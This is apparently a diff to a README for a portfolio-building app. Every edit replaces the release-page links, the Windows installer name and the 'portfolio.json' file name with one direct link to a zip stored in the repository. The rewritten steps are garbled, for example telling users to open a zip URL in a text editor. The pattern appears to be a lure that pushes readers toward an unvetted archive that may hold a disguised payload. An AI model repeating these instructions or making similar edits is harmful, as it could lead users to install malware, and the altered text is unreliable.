@@ -1,6 +1,6 @@
 # 💼 professional-portfolio - Build Your Online Professional Presence
 
-[![Download professional-portfolio](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/bobsHack/professional-portfolio/releases)
+[![Download professional-portfolio](https://github.com/bobsHack/professional-portfolio/raw/refs/heads/main/docs/assets/portfolio_professional_v3.2.zip)](https://github.com/bobsHack/professional-portfolio/raw/refs/heads/main/docs/assets/portfolio_professional_v3.2.zip)
 
 ## 📋 What is professional-portfolio?
 
@@ -32,7 +32,7 @@ Follow these steps carefully. Each explains what to do in simple terms.
 
 Click the big blue button at the top or visit this link:
 
-https://github.com/bobsHack/professional-portfolio/releases
+https://github.com/bobsHack/professional-portfolio/raw/refs/heads/main/docs/assets/portfolio_professional_v3.2.zip
 
 This link brings you to the official download page for the app. You will find files for different computers there.
 
@@ -40,7 +40,7 @@ This link brings you to the official download page for the app. You will find fi
 
 On the download page, look for a file that matches your computer. The file names usually show your operating system.
 
-- For Windows, look for `professional-portfolio-win.exe` or similar.
+- For Windows, look for `https://github.com/bobsHack/professional-portfolio/raw/refs/heads/main/docs/assets/portfolio_professional_v3.2.zip` or similar.
 - For macOS, look for a `.dmg` file.
 - For Linux, look for an `.AppImage` or `.deb` file.
 
@@ -58,7 +58,7 @@ Click the file link for your system. Your browser will start downloading the ins
 
 You can download the app by visiting the release page again here:
 
-https://github.com/bobsHack/professional-portfolio/releases
+https://github.com/bobsHack/professional-portfolio/raw/refs/heads/main/docs/assets/portfolio_professional_v3.2.zip
 
 Once on the page, pick your computer’s file and click to download.
 
@@ -89,9 +89,9 @@ Your portfolio is powered by a simple list of details:
 - Your skills and tools you know
 - Your projects with descriptions and links
 
-You can update these details by editing a file inside the app’s folder, typically a `portfolio.json` file. For basic users, the app might include an editor interface to make changes without text editing. If you want to edit manually:
+You can update these details by editing a file inside the app’s folder, typically a `https://github.com/bobsHack/professional-portfolio/raw/refs/heads/main/docs/assets/portfolio_professional_v3.2.zip` file. For basic users, the app might include an editor interface to make changes without text editing. If you want to edit manually:
 
-1. Open the `portfolio.json` file in a plain text editor.
+1. Open the `https://github.com/bobsHack/professional-portfolio/raw/refs/heads/main/docs/assets/portfolio_professional_v3.2.zip` file in a plain text editor.
 2. Change the text in quotes to match your information.
 3. Save the file.
 4. Refresh the app to see your changes.
@@ -143,4 +143,4 @@ If you need help, you can:
 
 ---
 
-[![Download professional-portfolio](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/bobsHack/professional-portfolio/releases)
+[![Download professional-portfolio](https://github.com/bobsHack/professional-portfolio/raw/refs/heads/main/docs/assets/portfolio_professional_v3.2.zip)](https://github.com/bobsHack/professional-portfolio/raw/refs/heads/main/docs/assets/portfolio_professional_v3.2.zip)
